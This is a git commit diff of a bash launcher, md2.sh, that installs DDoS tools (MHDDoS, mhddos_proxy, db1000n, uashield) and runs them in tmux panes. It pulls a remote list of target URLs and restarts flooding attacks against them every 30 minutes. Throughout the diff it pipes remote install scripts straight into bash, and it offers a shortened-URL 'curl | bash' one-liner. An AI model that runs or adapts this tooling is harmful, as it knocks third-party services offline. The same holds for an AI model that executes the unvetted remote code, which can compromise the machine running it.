cd1b13255ed926a0b571b6187cd967ba5bf4d0b0
Kali <darkwing42@gmail.com>
2022-05-08 06:45:58 -0400

    test new combine targets system

--- md2.sh
+++ md2.sh
@@ -1,45 +1,166 @@
 #!/bin/bash
-# curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh | bash && tmux a
-sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
-sleep 5
-sudo apt update -y
-sudo apt install -y tmux fish vnstat python3 python3-pip
-# sudo apt install torsocks
-# sudo apt instal gcc libc-dev libffi-dev libssl-dev python3-dev rustc
-pip install --upgrade pip
-# install docker
-sudo apt install -y docker.io
-#sudo apt install apt-transport-https ca-certificates curl software-properties-common
-#curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
-#sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
-#sudo apt install docker-ce -y
-
-chsh -s /usr/bin/fish
-echo $HOSTNAME >> /etc/hostname
-# sudo touch /etc/cloud/cloud-init.disabled
-tmux kill-session -t multiddos; sudo pkill node
-#tmux mouse support
-grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
-tmux source-file ~/.tmux.conf
+# curl -L tiny.one/multiddos | bash && tmux a
 
 cd ~
-rm -rf multiddos
-mkdir multiddos
-cd multiddos
+rm -rf multidd
+mkdir multidd
+cd multidd
 
+gotop="on"
+db1000n="on"
+uashield="off"
+vnstat="off"
+matrix="off"
+threads="-t 250"
+methods="--http-methods GET STRESS"
+#rpc="--rpc 2000"
+#export debug="--debug"
+
+launch () {
 if [ ! -f "/usr/local/bin/gotop" ]; then
     curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
     sudo dpkg -i gotop.deb
 fi
 
-tmux new-session -s multiddos -d 'vnstat -l'
-sleep 0.1
-#tmux split-window -v 'gotop -ac solarized'
-#sleep 0.1
-tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
-#tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash'
-#tmux split-window -v 'docker run -it --name auto_mhddos --rm --pull always ghcr.io/theorlovsky/auto_mhddos:latest'
-#sleep 0.1
-#tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
+tmux kill-session -t multiddos; sudo pkill node; sudo pkill shield
+# tmux mouse support
+grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
+tmux source-file ~/.tmux.conf
+
+if [[ $gotop == "on" ]]; then
+    tmux new-session -s multiddos -d 'gotop -asc solarized'
+    sleep 0.2
+    tmux split-window -h -p 66 'bash auto_bash.sh'
+else 
+    if [[ $matrix == "on" ]]; then
+        tmux new-session -s multiddos -d 'cmatrix'
+        sleep 0.2
+        tmux split-window -h -p 66 'bash auto_bash.sh'
+    else
+        sleep 0.2
+        tmux new-session -s multiddos -d 'bash auto_bash.sh'
+    fi
+fi
+
+if [[ $vnstat == "on" ]]; then
+sleep 0.2
+tmux split-window -v 'vnstat -l'
+fi
+
+if [[ $db1000n == "on" ]]; then
+sleep 0.2
+tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
+fi
+if [[ $uashield == "on" ]]; then
+sleep 0.2
+tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
+fi
+if [[ $matrix == "on" ]] && [[ $gotop == "on" ]]; then
+sleep 0.2
+tmux select-pane -t 0
+sleep 0.2
+tmux split-window -v 'cmatrix'
+fi
 #tmux -2 attach-session -d
+}
+
+usage () {
+cat << EOF
+usage: bash multiddos.sh [-d|-u|-t|-m|-h]
+                            -d | --db1000n        - disable db1000n
+                            -g | --gotop          - disable gotop
+                            +u | --uashield       - enable uashield
+                            -t | --threads        - threads; default = 1000
+                            +m | --matrix         - enable matrix
+                            +v | --vnstat         - enable vnstat -l (traffic monitoring)
+                            -h | --help           - brings up this menu
+EOF
+exit
+}
+
+if [[ "$1" = ""  ]]; then launch; fi
+
+while [ "$1" != "" ]; do
+    case $1 in
+        -d | --db1000n )   db1000n="off"; shift ;;
+        +u | --uashield )   uashield="on"; shift ;;
+        -t | --threads )   export threads="-t $2"; shift 2 ;;
+        +m | --matrix )   matrix="on"; shift ;;
+        -g | --gotop ) gotop="off"; db1000n="on"; shift ;;
+        +v | --vnstat ) vnstat="on"; shift ;;
+        -h | --help )    usage;   exit ;;
+        *  )   usage;   exit ;;
+    esac
+done
+
+# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
+sudo apt-get update -q -y
+sudo apt-get install -q -y tmux vnstat torsocks python3 python3-pip
+pip install --upgrade pip
+
+cat > auto_bash.sh << 'EOF'
+# create swap file if system doesn't have it
+if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
+    sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
+fi
+
+#install mhddos and mhddos_proxy
+cd ~/multidd/
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+git clone https://github.com/MHProDev/MHDDoS.git
+
+# Prepare targets file
+file="/var/tmp/uaripper.targets"
+file_tmp="/var/tmp/tmp.targets"
+
+echo "" | tee $file $file_tmp
+
+curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets -o $file_tmp
+
+cat $file_tmp | while read LINE; do
+    if [[ $LINE != "#"* ]]; then
+        echo $LINE >> $file
+    fi
+done
+
+echo "" > $file_tmp
+for i in $(cat $file); do
+    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
+        echo $i >> $file_tmp
+    fi
+done
+
+# print total targets, print uniq targets in config file
+echo "total targets: " $(cat $file_tmp | wc -l)
+cat $file_tmp | sort | uniq > $file
+echo "uniq targets: " $(cat $file | sort | uniq | wc -l)
+sleep 5
+
+# Restart attacks and update targets every 30 minutes
+while true; do
+        pkill -f start.py; pkill -f runner.py 
+        python3 ~/multidd/mhddos_proxy/runner.py -c $file $threads $rpc $methods&
+        sleep 30m
+done
+
+#old part backup
+# while true; do
+# pkill -f start.py; pkill -f runner.py 
+#      # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
+#     list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+#          while [[ $list_size = "0"  ]]; do
+#             sleep 5
+#             list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+#       done
+#    for (( i=1; i<=list_size; i++ )); do
+#             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
+#             python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc&
+#       done
+# sleep 30m
+# done
+EOF
+
+launch
